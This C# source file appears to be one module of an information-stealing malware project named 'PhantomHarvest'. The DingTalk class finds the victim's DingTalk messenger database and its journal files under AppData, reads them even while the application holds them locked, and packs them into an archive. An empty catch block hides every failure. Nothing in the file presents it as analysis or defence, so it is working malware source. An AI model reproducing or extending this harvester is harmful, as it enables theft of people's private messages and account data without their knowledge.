using System;
using System.IO;
using PhantomHarvest.Helper;

namespace PhantomHarvest.Messengers
{
	internal class DingTalk
	{
		public static void Collect(ArchiveManager zip)
		{
			try
			{
				string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "DingTalk\\globalStorage\\storage.db");
				if (File.Exists(text))
				{
					string text2 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "DingTalk\\globalStorage\\storage.db-shm");
					string text3 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "DingTalk\\globalStorage\\storage.db-wal");
					
					byte[] dbBytes = LockedFile.ReadLockedFile(text);
					if (dbBytes != null)
					{
						using (MemoryStream ms = new MemoryStream(dbBytes))
						{
							zip.AddStream(ArchiveManager.Compression.Deflate, DingTalk.MessengerName + "/storage.db", ms, DateTime.Now, "");
						}
					}
					
					if (File.Exists(text2))
					{
						byte[] shmBytes = LockedFile.ReadLockedFile(text2);
						if (shmBytes != null)
						{
							using (MemoryStream ms = new MemoryStream(shmBytes))
							{
								zip.AddStream(ArchiveManager.Compression.Deflate, DingTalk.MessengerName + "/storage.db-shm", ms, DateTime.Now, "");
							}
						}
					}
					
					if (File.Exists(text3))
					{
						byte[] walBytes = LockedFile.ReadLockedFile(text3);
						if (walBytes != null)
						{
							using (MemoryStream ms = new MemoryStream(walBytes))
							{
								zip.AddStream(ArchiveManager.Compression.Deflate, DingTalk.MessengerName + "/storage.db-wal", ms, DateTime.Now, "");
							}
						}
					}
				}
			}
			catch
			{
			}
		}

		public static string MessengerName = "DingTalk";
	}
}
